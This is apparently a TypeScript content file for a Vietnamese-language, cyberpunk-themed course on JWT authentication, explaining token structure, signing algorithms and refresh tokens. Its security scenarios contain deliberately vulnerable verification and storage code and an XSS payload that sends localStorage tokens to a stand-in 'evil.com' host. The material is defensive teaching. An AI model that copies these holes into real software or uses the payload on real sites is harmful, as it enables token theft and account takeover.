/**
 * JWT Authentication Lesson Content
 * Theme: DIGITAL SIGNATURE PROTOCOL - Cyberpunk 2084
 */

export const jwtAuthContent = {
  storyHook: {
    title: "HỘ CHIẾU ĐIỆN TỬ (DIGITAL PASSPORT)",
    subtitle: "Giao Thức JWT",
    clearanceLevel: "Universal Access",
    status: "ACTIVE",
    narrative: `Hãy tưởng tượng bạn đang ở sân bay quốc tế. Để qua cửa an ninh, an ninh sân bay KHÔNG CẦN gọi điện về phường xã của bạn để hỏi "Người này là ai?".

Thay vào đó, bạn đưa ra **Hộ Chiếu** (Passport).
Hộ chiếu này tự chứa mọi thứ: Tên bạn, ảnh của bạn, thời hạn, và quan trọng nhất: **Con Dấu Mộc Đỏ** (Signature) của chính phủ.

An ninh chỉ cần soi con dấu. Dấu thật, chưa bị tẩy xóa → Hộ chiếu hợp lệ → Cho qua.
**JWT (JSON Web Token)** chính là cuốn hộ chiếu điện tử đó. Nó cho phép người dùng đi khắp nơi trong hệ thống mà không cần server phải tra cứu database liên tục.`,
  },

  sections: [
    // ESSENTIAL SECTIONS
    {
      id: 'section-1',
      category: 'concepts' as const,
      title: 'Hộ Chiếu Số: JWT Là Gì?',
      icon: 'FileText',
      content: `### ✈️ Từ Sân Bay Đến Lập Trình

**Session (Cũ)** giống như **Sổ Hộ Khẩu**:
- Sổ để ở phường (Server Database).
- Mỗi lần bạn muốn chứng minh thư, bạn phải chạy ra phường.
- Cán bộ lục tìm trong tủ hồ sơ.
- Rất phiền nếu bạn đang ở nước ngoài (Mobile App/Microservices).

**JWT (Mới)** giống như **Hộ Chiếu**:
- Bạn tự cầm hộ chiếu (Token lưu ở Client).
- Bên trong có sẵn tên, quyền hạn (Claims).
- Có "con dấu" điện tử chống làm giả (Signature).
- Server KHÔNG CẦN lục database. Chỉ cần verify "con dấu" là xong.

### 🔍 Bản Chất Kỹ Thuật
JWT là một chuỗi ký tự dài, chứa thông tin dạng JSON, được ký mã hóa (signed).
Nó là tiêu chuẩn vàng cho:
- **Mobile Apps**: Vì điện thoại không xử lý cookie tốt như trình duyệt.
- **Microservices**: Vì các service không cần chọc vào database chung để verify user.
- **Single Sign-On (SSO)**: Đăng nhập 1 lần, dùng cho nhiều web khác nhau.

**Điểm cốt lõi**:
- **Stateless**: Server không lưu gì cả. Token tự chứa thông tin.
- **Self-contained**: Mọi thứ cần thiết đều nằm trong token.`,
      keyPoints: [
        'Tự chứa thông tin (Self-contained): Token mang theo data user',
        'Không trạng thái (Stateless): Server không cần lưu session ID',
        'Chữ ký điện tử (Signed): Không thể giả mạo nếu không có Secret Key',
        'Linh hoạt (Portable): Dùng tốt cho Web, App, API, Microservices'
      ],
      visual: 'So sánh: Sổ Hộ Khẩu (Server giữ) vs Hộ Chiếu (Bạn giữ)',
    },
    {
      id: 'section-2',
      category: 'concepts' as const,
      title: 'Cấu Trúc JWT: 3 Phần Của Tấm Hộ Chiếu',
      icon: 'Package',
      content: `Giống như một cuốn hộ chiếu có 3 phần chính, JWT cũng vậy (ngăn cách bởi dấu chấm \`.\`):

### 1. Header (Trang Bìa)
Màu đỏ: \`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\`
- Cho biết "Đây là loại giấy tờ gì?" (JWT).
- Dùng "mực" loại nào để đóng dấu? (Thuật toán HS256, RS256...).

### 2. Payload (Trang Thông Tin)
Màu tím: \`eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ\`
- Chứa thông tin của bạn: ID, Tên, Quyền hạn (Admin/User).
- Ngày cấp (\`iat\`), Ngày hết hạn (\`exp\`).
- ⚠️ **Lưu ý chết người**: Phần này AI CŨNG ĐỌC ĐƯỢC!
  - Tuyệt đối không để password hay thông tin mật ở đây.
  - Giống như hộ chiếu: Ai cầm được là đọc được tên tuổi bạn.

### 3. Signature (Con Dấu Chống Giả)
Màu xanh: \`SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\`
- Được tạo ra bằng cách: \`Header + Payload + Secret Key\` (Chìa khóa bí mật của Server).
- Nếu ai đó sửa tên bạn trong Payload → "Con dấu" sẽ không khớp → Hộ chiếu bị coi là giả ngay lập tức.

### 📝 Công Thức
\`Signature = HMACSHA256(base64(Header) + "." + base64(Payload), SecretKey)\``,
      keyPoints: [
        'Header: Loại token và thuật toán ký',
        'Payload: Chứa data (Claims) - Ai cũng đọc được!',
        'Signature: Đảm bảo tính toàn vẹn - Chỉ server có Secret Key mới tạo được',
        'Tuyệt đối KHÔNG lưu thông tin mật (Password/Thẻ) trong Payload'
      ],
      visual: 'Hình ảnh hộ chiếu được phân rã thành 3 phần màu sắc tương ứng',
      codeExamples: {
        javascript: `// Thử giải mã JWT (Dễ ợt!)
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTczNTYwMzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

// Decode (anyone can do this!)
const [header, payload, signature] = token.split('.');

// Ai cũng decode được Header & Payload!
const decodedPayload = JSON.parse(atob(payload));
console.log(decodedPayload);
// Output: { "id": 1, "role": "admin", "exp": 1735603200 }

// Nhưng KHÔNG AI giả mạo được Signature nếu thiếu Secret Key!`,
        python: `# Python Example
import jwt

# Mã hóa (Server làm)
encoded = jwt.encode({"some": "payload"}, "secret", algorithm="HS256")

# Giải mã (Ai cũng làm được nếu không verify signature)
jwt.decode(encoded, options={"verify_signature": False})`,
        csharp: `// C# Example
var handler = new JwtSecurityTokenHandler();
var jsonToken = handler.ReadToken(stream);
var tokenS = jsonToken as JwtSecurityToken;

// Đọc thông tin công khai
var role = tokenS.Claims.First(claim => claim.Type == "role").Value;`
      }
    },
    {
      id: 'section-3',
      category: 'concepts' as const,
      title: 'Quy Trình: Từ Cổng Xử Lý Đến Cửa Khẩu',
      icon: 'Workflow',
      content: `Quy trình dùng JWT khác hẳn Session. Nó giống đi máy bay hơn:

### 🛫 Bước 1: Check-in (Login)
- Bạn gửi User/Pass lên Server.
- Server kiểm tra đúng → "Đóng dấu" cấp cho bạn 1 cái JWT (Hộ chiếu).

### 🛂 Bước 2: Đi qua cửa an ninh (Request)
- Server KHÔNG lưu gì cả. Server quên bạn ngay lập tức.
- Mỗi lần bạn gọi API (Load danh sách sản phẩm, post bài...), bạn phải kèm theo JWT.
- Thường để trong Header: \`Authorization: Bearer <token>\`.

### 🔍 Bước 3: Soi chiếu (Validate)
- Server nhận JWT.
- Server lấy "Secret Key" ra để kiểm tra chữ ký (Signature).
- ✅ Nếu khớp: Cho qua.
- ❌ Nếu sai (hoặc hết hạn): Đuổi về (401 Unauthorized).

### ⚖️ Đánh Đổi
- **Session**: Server nhớ bạn, nên logout cái là chết ngay. (An toàn hơn, tốn RAM hơn).
- **JWT**: Server không nhớ bạn. Bạn làm mất JWT → Hacker dùng được cho đến khi hết hạn. (Scale tốt hơn, rủi ro hơn).`,
      keyPoints: [
        'Login thành công = Nhận Token',
        'Client phải tự lưu Token (thường là localStorage hoặc Cookie)',
        'Gửi Token kèm mọi request (Authorization Header)',
        'Server chỉ verify chữ ký, không tra database (Nhanh!)',
        'Khó thu hồi (Revoke) hơn Session'
      ],
      visual: 'Flowchart: Client (Gửi Pass) → Server (Trả Token) → Client (Gửi Token) → Server (Verify)',
    },

    // IMPORTANT SECTIONS
    {
      id: 'section-4',
      category: 'system' as const,
      title: 'Refresh Token: Thẻ Thành Viên VIP',
      icon: 'RotateCw',
      content: `Access Token thường hết hạn rất nhanh (15 phút) để bảo mật. Nhưng bắt user login lại mỗi 15 phút thì họ sẽ bỏ app ngay.
Giải pháp là **Refresh Token**.

### 🎫 Cơ Chế "Vé Cổng & Thẻ VIP"
1.  **Access Token (Vé Cổng - 15 phút)**: Dùng để đi chơi các trò chơi (gọi API).
2.  **Refresh Token (Thẻ VIP - 7 ngày)**: Cất kỹ trong ví. Chỉ dùng khi Vé Cổng hết hạn.

### 🔄 Quy Trình Tự Động Gia Hạn
1.  Đang lướt web, Access Token hết hạn → API trả về lỗi 401.
2.  App (âm thầm) gửi Refresh Token lên server xin cấp lại.
3.  Server thấy Refresh Token hợp lệ → Cấp Access Token mới.
4.  App lưu vé mới và tiếp tục chạy. User không hề hay biết!

### 🛡️ Tại Sao Lại Phức Tạp Vậy?
- Nếu Hacker trộm được **Access Token**: Hắn chỉ phá hoại được 15 phút.
- **Refresh Token** được lưu trong **HttpOnly Cookie** (JavaScript không đọc được) → Hacker khó trộm hơn nhiều.
- Nếu mất Refresh Token? Bạn có thể **Revoke** (thu hồi) nó để đá kẻ gian ra khỏi tài khoản ngay lập tức.`,
      keyPoints: [
        'Access Token (ngắn hạn): Dùng gọi API resource',
        'Refresh Token (dài hạn): Dùng lấy Access Token mới',
        'Tách biệt giúp giảm thiểu rủi ro khi lộ token',
        'Refresh Token nên lưu trong HttpOnly Cookie để chống XSS',
        'Cho phép tính năng "Đăng xuất khỏi tất cả thiết bị"'
      ],
      visual: 'Timeline: Access Token hết hạn liên tục → Refresh Token cấp mới liên tục',
    },
    {
      id: 'section-5',
      category: 'security' as const,
      title: 'Thuật Toán Ký: HS256 vs RS256',
      icon: 'Lock',
      content: `Chọn thuật toán ký cũng giống như chọn khóa cửa vậy. Có 2 loại phổ biến nhất:

### 🔑 HS256 (Đối Xứng - Symmetric)
**Ví dụ: Chìa khóa cửa cuốn.**
- Cả Auth Server và API Server đều dùng **CHUNG 1 chìa khóa** (Secret Key).
- Ông A đóng cửa (Ký token), Ông B mở cửa (Verify token) bằng cùng 1 chìa.
- **Ưu điểm**: Nhanh, gọn, lẹ.
- **Rủi ro**: Nếu ông B làm mất chìa, kẻ trộm có thể tự tạo token giả mạo ông A.

### ✍️ RS256 (Bất Đối Xứng - Asymmetric)
**Ví dụ: Tổng Giám Đốc ký quyết định.**
- Sếp giữ **Con Dấu Riêng (Private Key)** để đóng dấu (Sign).
- Nhân viên toàn công ty giữ **Chữ Ký Mẫu (Public Key)** để soi (Verify).
- Nhân viên dù có chữ ký mẫu cũng **KHÔNG THỂ** giả mạo con dấu của sếp.
- **Ưu điểm**: Cực kỳ an toàn cho hệ thống lớn (Microservices). Server con có bị hack cũng không sao tạo được token giả.

### 🏆 Khi Nào Dùng Gì?
- **HS256**: App nhỏ, team nhỏ, Monolith (1 server làm tất).
- **RS256**: App lớn, Microservices, Public API (Google/Facebook dùng cái này).`,
      keyPoints: [
        'HS256: 1 chìa khóa chung (Secret Key) - Dùng cho app nhỏ',
        'RS256: 2 chìa (Private Sign, Public Verify) - Dùng cho hệ thống lớn',
        'HS256 nhanh hơn nhưng rủi ro lộ key cao hơn',
        'RS256 an toàn hơn vì Public Key có thể công khai thoải mái'
      ],
      visual: 'Diagram: HS256 (2 người cầm chung 1 chìa) vs RS256 (1 người đóng dấu, 100 người soi dấu)',
    },
    {
      id: 'section-6',
      category: 'concepts' as const,
      title: 'JWT vs Session: The Ultimate Showdown',
      icon: 'Swords',
      content: `Choosing between JWT and sessions is one of the most debated topics in web authentication.
Both have strengths and weaknesses. Understanding the trade-offs is critical for making the right choice.

**Scalability:**
- Session: Requires shared state (Redis, sticky sessions, replication)
- JWT: Truly stateless, scales horizontally with zero coordination
- Winner: JWT for distributed systems

**Revocation:**
- Session: Instant - delete from database, user is logged out
- JWT: No revocation until expiration (can workaround with blacklist, but defeats stateless benefit)
- Winner: Session for security-critical applications

**Performance:**
- Session: Database lookup on every request (can be fast with Redis)
- JWT: No lookup, just signature verification (cryptographic overhead)
- Winner: Tie (both can be optimized)

**Mobile Apps:**
- Session: Cookies work poorly in mobile environments
- JWT: Perfect - just an HTTP header, works anywhere
- Winner: JWT for mobile/native apps

**Security:**
- Session: Server controls everything, can expire/revoke anytime
- JWT: Client holds token, vulnerable if secret key leaks
- Winner: Session for maximum control

**The Hybrid Approach:**
Many apps use both: sessions for web app, JWT for mobile API. Or use JWT for access tokens + server-side refresh tokens.`,
      keyPoints: [
        'Sessions: Better revocation, instant logout, server control',
        'JWT: Better scalability, mobile-friendly, stateless',
        'Sessions require shared storage, JWT requires secret management',
        'Hybrid approach: Sessions for web, JWT for mobile',
        'No universal winner - choose based on your requirements'
      ],
      visual: 'Comparison table: Session vs JWT across 10 criteria',
    },

    // ADVANCED SECTIONS
    {
      id: 'section-7',
      category: 'security' as const,
      title: '3 Lỗ Hổng Chết Người Của JWT',
      icon: 'ShieldAlert',
      content: `JWT rất mạnh, nhưng nếu code ẩu thì cực kỳ dễ toang. Dưới đây là 3 cách hacker "luộc" hệ thống của bạn:

### 🎭 Attack 1: Ký "Khống" (Alg: None)
- **Kịch bản**: Hacker bắt được token. Hắn sửa Header thành \`"alg": "none"\` (không dùng thuật toán nào).
- **Hành động**: Hắn xóa luôn phần chữ ký (Signature).
- **Kết quả**: Server ngây thơ đọc thấy "none" -> Bỏ qua bước kiểm tra chữ ký -> Hacker tự sửa Payload thành Admin -> **HACKED**.

### 🔓 Attack 2: Mật Khẩu "Cùi Bắp" (Weak Secret)
- **Kịch bản**: Dev đặt Secret Key là \`"secret"\`, \`"123456"\`, hoặc tên người yêu cũ.
- **Hành động**: Hacker đem token về máy nhà, chạy tool dò pass (Brute-force) offline.
- **Kết quả**: Với máy tính hiện nay, pass dưới 10 ký tự dò ra trong tích tắc. Có Secret Key -> Tự ký token mới -> **HACKED**.

### 🦹 Attack 3: Móc Túi (XSS Token Theft)
- **Kịch bản**: Dev lưu JWT trong \`localStorage\` cho tiện.
- **Hành động**: Hacker chèn mã độc JS vào web (qua comment, form...).
- **Kết quả**: Mã độc đọc trộm \`localStorage\` -> Gửi token về cho hacker -> **MẤT NICK**.

### 🛡️ Phòng Thủ
1. Cấm tiệt \`alg: none\` trong code.
2. Secret Key phải dài ngoằng, ngẫu nhiên (32 ký tự trở lên).
3. Lưu token trong **HttpOnly Cookie**, đừng lưu localStorage.`,
      keyPoints: [
        'Không bao giờ chấp nhận "alg: none"',
        'Secret Key phải mạnh (dài > 32 ký tự, ngẫu nhiên)',
        'Lưu token ở localStorage rất dễ bị XSS trộm mất',
        'Luôn kiểm tra thời hạn (exp claim)'
      ],
      visual: 'Security scenario cards (handled by SecurityScenario component)',
    },
    {
      id: 'section-8',
      category: 'best_practices' as const,
      title: 'Quản Lý Claims: Đừng Nhét Cả Thế Giới Vào Token',
      icon: 'FileJson',
      content: `Claims chính là những thông tin nằm trong phần Payload. Việc chọn cái gì nên đưa vào đây là cả một nghệ thuật.

### 📋 Claims Chuẩn (Nên có)
- \`sub\` (Subject): ID người dùng. Cái này bắt buộc.
- \`exp\` (Expiration): Ngày hết hạn. Không có cái này là token vĩnh cửu = LỖI BẢO MẬT.
- \`iat\` (Issued At): Ngày cấp.

### 🛠️ Claims Tự Chế (Tùy biến)
- \`role\`: Chức vụ (Admin/User). Giúp UI ẩn hiện nút bấm nhanh gọn.
- \`plan\`: Gói cước (Free/Pro).

### ❌ Những Điều Cấm Kỵ (QUAN TRỌNG)
1. **Tuyệt đối KHÔNG chứa mật khẩu**: Dù đã hash cũng không được.
2. **Tuyệt đối KHÔNG chứa thông tin nhạy cảm**: Số CMND, Thẻ tín dụng, Số điện thoại. Vì ai cũng decode được Payload.
3. **Đừng tham lam**: Đừng nhét cả object User to đùng vào.
   - Token sẽ bị nặng (ví dụ 10KB).
   - Mỗi request (F5 trang web) đều phải tải cục 10KB này lên server. Mạng chậm, tốn băng thông 4G của user.

### 💡 Lời Khuyên
Token chỉ nên chứa những gì **cần thiết nhất** để xác thực (ID, Role). Cần thêm thông tin chi tiết? Hãy dùng ID đó để query database (hoặc Cache).`,
      keyPoints: [
        'Bắt buộc phải có: sub (ID), exp (Hết hạn)',
        'Dữ liệu trong payload là CÔNG KHAI (ai cũng đọc được)',
        'Giữ token nhỏ gọn (< 2KB) để tối ưu tốc độ',
        'Không bao giờ lưu data nhạy cảm vào token'
      ],
      visual: 'Claims diagram showing standard vs custom vs forbidden claims',
    },
    {
      id: 'section-9',
      category: 'best_practices' as const,
      title: 'Checklist Trước Khi Lên Sóng (Production)',
      icon: 'Rocket',
      content: `Trước khi deploy code lên môi trường thật, hãy check kỹ danh sách này. Thiếu một mục cũng có thể khiến bạn mất việc.

### 🔑 Secret Key (Trái Tim Hệ Thống)
- [ ] **Độ mạnh**: Dài ít nhất 32 ký tự ngẫu nhiên (đừng dùng "mysecret").
- [ ] **Lưu trữ**: Để trong biến môi trường (\`.env\`). Cấm commit lên Git!
- [ ] **Rotation**: Có phương án đổi key định kỳ (ví dụ 6 tháng/lần).

### ⚙️ Cấu Hình Token
- [ ] **Access Token**: Hết hạn sau 15-30 phút.
- [ ] **Refresh Token**: Hết hạn sau 7-30 ngày.
- [ ] **Algorithm**: Dùng HS256 cho app đơn giản, RS256 cho Microservices.

### 🛡️ Lưu Trữ & Vận Chuyển
- [ ] **Bắt buộc HTTPS**: Để mã hóa đường truyền.
- [ ] **HttpOnly Cookie**: Nơi an toàn nhất để lưu Refresh Token.
- [ ] **SameSite Strict**: Chặn CSRF Attack.

### 🔍 Kiểm Tra (Validation)
- [ ] **Luôn check \`exp\`**: Token hết hạn là vứt.
- [ ] **Check \`iss\` & \`aud\`**: Đảm bảo token này do mình cấp, và cấp cho đúng client này.
- [ ] **Chặn \`alg: none\`**: Đừng để hacker lừa.

### 🚨 Giám Sát (Monitoring)
- [ ] Log lại những lần login thất bại.
- [ ] Cảnh báo khi 1 user nhưng login từ 2 quốc gia khác nhau trong 1 phút.`,
      keyPoints: [
        'Secret Key là thứ quan trọng nhất - Giữ như giữ vàng',
        'Luôn dùng HTTPS',
        'Access Token ngắn hạn - Refresh Token dài hạn',
        'Lưu trữ ở client phải an toàn (Cookie HttpOnly)',
        'Đừng tin tưởng mù quáng vào dữ liệu client gửi lên'
      ],
      visual: 'Checklist with expandable sections for each category',
    },
  ],

  securityScenarios: [
    {
      id: 'scenario-1',
      title: 'Giả Mạo Chữ Ký (Alg: None Attack)',
      threatLevel: 'HIGH' as const,
      attack: `Hacker chặn bắt được một JWT hợp lệ. Hắn giải mã Header và sửa thuật toán từ "HS256" thành "none". Sau đó hắn xóa luôn phần chữ ký (Signature) ở cuối token. Token giờ đây chỉ còn: header.payload. (lưu ý dấu chấm cuối cùng). Một server cấu hình lỏng lẻo có thể chấp nhận token này là hợp lệ.`,
      exploitation: `Vì server không kiểm tra chữ ký nữa, hacker có thể sửa bất kỳ thông tin nào trong Payload. Hắn sửa "role": "user" thành "role": "admin". Hắn trở thành Admin ngay lập tức mà không cần biết Secret Key!`,
      defense: `KHÔNG BAO GIỜ chấp nhận token có "alg": "none". Các thư viện JWT hiện đại thường chặn cái này mặc định, nhưng hãy kiểm tra lại cấu hình. Luôn chỉ định rõ thuật toán mong muốn (ví dụ: algorithms: ['HS256']).`,
      vulnerableCode: {
        language: 'javascript' as const,
        label: 'Vulnerable Code',
        code: `// VULNERABLE - No algorithm enforcement
function verifyToken(token) {
  const [header, payload, signature] = token.split('.');

  const decodedPayload = JSON.parse(atob(payload));

  // DANGER: No signature verification!
  // No algorithm checking!
  return decodedPayload;
}`
      },
      secureCode: {
        language: 'javascript' as const,
        label: 'Secure Code',
        code: `// SECURE - Proper algorithm enforcement
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  try {
    // Verify signature AND enforce algorithm
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],  // ONLY accept HS256
      // Reject "none" algorithm automatically
    });

    return decoded;
  } catch (error) {
    throw new Error('Invalid token');
  }
}`
      }
    },
    {
      id: 'scenario-2',
      title: 'Bẻ Khóa Mật Khẩu (Brute-Force)',
      threatLevel: 'HIGH' as const,
      attack: `Hacker lấy được JWT token. Vì Payload chỉ là Base64 (ai cũng đọc được), hắn không cần bẻ khóa payload. Mục tiêu của hắn là tìm ra Secret Key. Hắn dùng tool chạy thử hàng triệu mật khẩu phổ biến ("secret", "123456", "admin").`,
      exploitation: `Nếu Secret Key của bạn quá yếu (dưới 32 ký tự), hacker sẽ tìm ra nó chỉ trong vài phút. Khi có Secret Key, hắn có thể TỰ TẠO ra bất kỳ token nào hắn muốn. Hắn sẽ tự cấp cho mình quyền Admin vĩnh viễn.`,
      defense: `Dùng Secret Key đủ mạnh (ít nhất 32 ký tự ngẫu nhiên). Đừng bao giờ hardcode trong code, hãy dùng biến môi trường. Tốt nhất là dùng key do máy tạo ra (random bytes) chứ không phải do người gõ.`,
      vulnerableCode: {
        language: 'javascript' as const,
        label: 'Vulnerable Code',
        code: `// VULNERABLE - Weak secret key
const jwt = require('jsonwebtoken');

// DANGER: Only 6 characters, easily brute-forced!
const JWT_SECRET = 'secret';

function createToken(userId) {
  return jwt.sign(
    { sub: userId, role: 'user' },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
}`
      },
      secureCode: {
        language: 'javascript' as const,
        label: 'Secure Code',
        code: `// SECURE - Strong cryptographic secret
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate strong secret (run once, store in .env)
// const secret = crypto.randomBytes(64).toString('hex');

// Load from environment variable
const JWT_SECRET = process.env.JWT_SECRET;

// Validate secret strength on startup
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}

function createToken(userId) {
  return jwt.sign(
    { sub: userId, role: 'user' },
    JWT_SECRET,
    { expiresIn: '15m', algorithm: 'HS256' }
  );
}`
      }
    },
    {
      id: 'scenario-3',
      title: 'Móc Túi (XSS Token Theft)',
      threatLevel: 'MEDIUM' as const,
      attack: `Dev lưu JWT trong localStorage để tiện lấy ra dùng. Hacker tìm được một lỗi XSS trên web (ví dụ: khung comment không lọc thẻ script). Hắn chèn đoạn mã: <script>fetch('hacker.com?t='+localStorage.getItem('token'))</script>.`,
      exploitation: `Khi người dùng khác vào xem comment đó, trình duyệt của họ sẽ chạy đoạn script của hacker. Script này lặng lẽ lấy token trong localStorage và gửi về máy chủ của hacker. Hacker giờ có thể dùng token đó để login vào tài khoản nạn nhân.`,
      defense: `ĐỪNG lưu JWT trong localStorage. Hãy lưu trong HttpOnly Cookie. Cookie loại này không thể bị đọc bởi JavaScript (document.cookie sẽ trả về rỗng), nên dù web có bị lỗi XSS thì hacker cũng không lấy được token.`,
      vulnerableCode: {
        language: 'javascript' as const,
        label: 'Vulnerable Code',
        code: `// VULNERABLE - localStorage exposes token to XSS
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  });

  const { token } = await response.json();

  // DANGER: Any XSS can steal this!
  localStorage.setItem('token', token);
}

// Attacker's XSS payload:
// <script>
//   fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
// </script>`
      },
      secureCode: {
        language: 'javascript' as const,
        label: 'Secure Code',
        code: `// SECURE - httpOnly cookie (server-side)
// Server sets cookie instead of sending in response body
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  const token = jwt.sign({ sub: user.id }, JWT_SECRET);

  // Set as httpOnly cookie - JavaScript can't access it
  res.cookie('token', token, {
    httpOnly: true,      // Blocks document.cookie
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 900000       // 15 minutes
  });

  res.json({ success: true });
});

// Client side - no storage needed!
// Cookie sent automatically with every request`
      }
    }
  ],

  challenges: [
    {
      id: 'challenge-1',
      title: 'Giải Mã Chữ Ký',
      difficulty: 'Easy' as const,
      description: `Bạn bắt được một token rơi giữa đường. Nhiệm vụ: Giải mã Header và Payload để xem ai là chủ nhân của nó. Sau đó dùng Secret Key để kiểm tra xem chữ ký có hợp lệ không.`,
      points: 100
    },
    {
      id: 'challenge-2',
      title: 'Xưởng In Hộ Chiếu',
      difficulty: 'Medium' as const,
      description: `Xây dựng hệ thống cấp phát token. Code của bạn phải tạo ra token với đầy đủ claims chuẩn (sub, exp, iat), ký tên an toàn, và có chức năng verify token người khác gửi lên.`,
      points: 250
    },
    {
      id: 'challenge-3',
      title: 'Đại Phá Hệ Thống',
      difficulty: 'Hard' as const,
      description: `Hệ thống này có 5 lỗ hổng chết người: Secret yếu, không check thuật toán, không check hạn dùng, lưu localStorage, và thiếu check audience. Hãy tìm và vá tất cả lỗ hổng.`,
      points: 500
    }
  ],

  achievements: {
    levels: [
      {
        id: 'protocol-initiate',
        name: 'Tân Binh Token',
        range: [0, 30],
        description: 'Bạn đã hiểu cấu trúc cơ bản của JWT',
        icon: 'FileText',
        color: 'text-blue-400'
      },
      {
        id: 'security-operative',
        name: 'Kỹ Sư JWT',
        range: [31, 60],
        description: 'Bạn có thể triển khai JWT an toàn cho production',
        icon: 'Package',
        color: 'text-neon-400'
      },
      {
        id: 'elite-guardian',
        name: 'Chuyên Gia Chữ Ký',
        range: [61, 90],
        description: 'Bạn nằm lòng các kỹ thuật bảo mật và Refresh Token',
        icon: 'ShieldCheck',
        color: 'text-purple-400'
      },
      {
        id: 'master-architect',
        name: 'Kiến Trúc Sư Stateless',
        range: [91, 100],
        description: 'Bậc thầy về hệ thống xác thực phi trạng thái',
        icon: 'Award',
        color: 'text-yellow-400'
      }
    ],
    calculateProgress: (completedSections: string[], completedChallenges: string[]) => {
      const sectionWeight = 70;
      const challengeWeight = 30;

      const sectionProgress = (completedSections.length / 9) * sectionWeight;
      const challengeProgress = (completedChallenges.length / 3) * challengeWeight;

      return Math.floor(sectionProgress + challengeProgress);
    },
    getLevel: (percentage: number) => {
      if (percentage >= 91) return 'master-architect';
      if (percentage >= 61) return 'elite-guardian';
      if (percentage >= 31) return 'security-operative';
      return 'protocol-initiate';
    }
  },

  crossReferences: {
    session: {
      title: 'Cần Thu Hồi Ngay? Dùng Session',
      description: `Session cho phép logout tức thì và kiểm soát hoàn toàn từ server. Nếu ứng dụng của bạn cần tính năng "đá" user ra ngay lập tức (Ngân hàng, Admin), hãy dùng Session. Hoặc dùng lai: Web dùng Session, Mobile App dùng JWT.`,
      link: '/session'
    },
    mfa: {
      title: 'Bảo Mật Tối Đa Với MFA',
      description: `Dù JWT có xịn đến đâu, nếu bị trộm token là hacker vào được hết. MFA (Xác thực 2 bước) thêm một lớp bảo vệ nữa. Kể cả mất token, hacker vẫn tắc ở bước nhập OTP.`,
      link: '/mfa/learn'
    },
    oauth: {
      title: 'Học OAuth 2.0 & Token',
      description: `OAuth cũng dùng Access Token (thường là JWT) để ủy quyền. Khi bạn bấm "Login with Google", thực chất là bạn đang nhận về một cái token y hệt như những gì bạn vừa học.`,
      link: '/oauth/learn'
    }
  }
};
